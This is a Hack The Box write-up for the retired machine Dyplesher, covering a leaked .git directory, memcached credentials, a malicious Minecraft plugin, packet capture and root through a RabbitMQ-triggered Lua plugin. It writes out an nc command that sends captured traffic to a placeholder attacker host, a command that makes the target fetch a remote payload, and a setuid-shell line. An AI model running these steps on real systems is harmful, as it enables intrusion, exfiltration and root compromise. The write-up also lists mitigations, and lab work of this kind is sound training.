---
machine: Dyplesher
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, web, git, memcached, gogs, minecraft, rabbitmq, privesc]
---

# Dyplesher — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The `test.dyplesher.htb` vhost exposes a `.git` directory containing `index.php` and memcached credentials. Service `11211` only accepts the binary protocol with SASL; a compatible client reads the hashes for `MinatoTW`, `felamos` and `yuntao`. One cracks and gives access to Gogs, where a release contains repository bundles. The Minecraft repository includes a LoginSecurity SQLite database with another hash, leading to the admin panel. Uploading a malicious Bukkit plugin writes a webshell and an SSH key, giving access as `MinatoTW`. Membership of the `wireshark` group allows packet capture with `dumpcap`; RabbitMQ traffic yields `felamos`' credentials. A note in their home describes the `plugin_data` exchange; publishing a URL to a Lua plugin executes code as root.

## Recon

```bash
nmap -Pn -sCV -p22,80,3000,4369,5672,11211,25562,25565,25672 <IP>
```

- `22` OpenSSH 8.0p1.
- `80` Apache 2.4.41; `dyplesher.htb` and `test.dyplesher.htb`.
- `3000` Gogs.
- `4369`/`25672` Erlang/EPMD; `5672` RabbitMQ 3.7.8.
- `11211` memcached with authentication.
- `25565` Minecraft service; `25562` unidentified.

```bash
echo '<IP> dyplesher.htb test.dyplesher.htb' | sudo tee -a /etc/hosts
```

The main site is a Minecraft server page linking to staff. `test` is a form that adds keys to memcached.

## Enumeration

`nmap -sC` against `test.dyplesher.htb` finds `/.git/`. Dump it with GitTools:

```bash
gitdumper.sh http://test.dyplesher.htb/.git/ ./git
cd git && git reset --hard
```

`index.php` uses `Memcached` with `OPT_BINARY_PROTOCOL` and `setSaslAuthData`, revealing the memcached credentials. The text protocol does not work; `memcached-cli` or `memccat` reads the `username`, `email` and `password` keys. The bcrypt hashes crack with `hashcat -m 3200`; one belongs to `felamos`.

## Foothold

`felamos`' password works on Gogs. The `gitlab` repository has a `repo.zip` release with four bundles; the only original one is a Minecraft server with a `LoginSecurity` plugin and `users.db`. The hash in `users.db` cracks and gives the `dyplesher.htb` panel password.

The panel allows Bukkit plugins to be uploaded and loaded. Build a Java 8 plugin whose `onEnable()` writes a PHP webshell and an SSH key:

```java
getLogger().info("plugin loaded");
// write /var/www/test/0xdf.php and /home/MinatoTW/.ssh/authorized_keys
```

After uploading and loading it, the webshell responds as `MinatoTW` and the SSH key gives a stable session.

## Lateral movement

`MinatoTW` belongs to the `wireshark` group; `/usr/bin/dumpcap` has `cap_net_admin,cap_net_raw`. Capture `docker0` traffic and exfiltrate it over an allowed port (5672 or 11211), since the firewall blocks the rest:

```bash
dumpcap -w /dev/shm/out.pcapng
cat /dev/shm/out.pcapng | nc <ATTACKER> 5672
```

The PCAP shows the memcached cron, Erlang traffic and, every two minutes, an AMQP publish with `yuntao`/`felamos` credentials. Those credentials give SSH as `felamos`.

## Privilege escalation

`felamos`' home contains a `yuntao` directory with `send.sh`, describing the `plugin_data` exchange and the Cuberite plugin review flow. Publish a URL with `amqp-publish`:

```bash
amqp-publish --uri='amqp://<USER>:<PASS>@<IP>:5672' \
  --exchange plugin_data --body 'http://<ATTACKER>:11211/pwn.lua'
```

The Lua plugin is downloaded and executed as root. An `os.execute()` can write a key to `/root/.ssh/authorized_keys`, copy `dash` with setuid or launch a reverse shell:

```lua
os.execute("cp /bin/dash /tmp/.pwn; chmod 4777 /tmp/.pwn")
```

Then `/tmp/.pwn -p` gives a shell with effective UID 0.

## Evidence

- `/.git/` on `test.dyplesher.htb` and credentials in `index.php`.
- Memcached keys and a cracked bcrypt hash.
- `repo.zip`, `users.db` and panel access.
- Malicious Bukkit plugin loaded with a webshell/SSH key.
- `dumpcap` and a PCAP with AMQP credentials.
- `send.sh`, a publish to `plugin_data` and `/tmp/.pwn -p` as root.

## Lessons learned

- An exposed `.git` can contain credentials that are absent from the current code.
- Memcached with SASL requires the binary protocol; the text client does not work.
- Gogs repositories and releases can leak databases and plugins.
- A Minecraft plugin is code executed with the server's privileges.
- Packet capture can reveal credentials for internal services.

## Mitigations and detection

- Do not publish `.git`, backups or releases containing user data.
- Authenticate memcached and bind it to localhost; avoid shared credentials.
- Review and sign plugins before loading them; run the Minecraft server unprivileged.
- Encrypt AMQP and restrict the `plugin_data` exchange to authenticated publishers.
- Detect new plugins, webroot writes, unexpected `dumpcap` and outbound connections to `5672`/`11211`.

## References

- [0xdf — Dyplesher](https://0xdf.gitlab.io/2020/10/24/htb-dyplesher.html)
- [IppSec — Dyplesher](https://www.youtube.com/watch?v=F6oSpOWOjSQ)
- [Hack The Box — Dyplesher](https://app.hackthebox.com/machines/dyplesher)
